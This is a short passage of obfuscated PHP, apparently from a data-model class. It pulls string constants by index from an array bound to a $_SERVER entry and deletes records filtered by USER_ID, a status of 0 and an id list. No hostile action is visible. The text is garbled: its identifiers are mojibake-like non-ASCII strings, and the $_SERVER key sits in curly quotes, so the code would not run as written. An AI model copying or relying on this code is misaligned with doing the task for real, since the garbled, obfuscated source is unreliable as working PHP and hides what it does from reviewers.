$‰‚¶®Ç÷ =& $_SERVER[‘ÆÜ‘œ]; if (is_array($î›ÆéÄ)) { $î›ÆéÄ = array($‰‚¶®Ç÷[7], $î›ÆéÄ); } $ä˜‹²¤É = array($‰‚¶®Ç÷[1921] => USER_ID, $‰‚¶®Ç÷[581] => array($‰‚¶®Ç÷[1132], 0), $‰‚¶®Ç÷[518] => $î›ÆéÄ); return $this->where($ä˜‹²¤É)->delete(); } }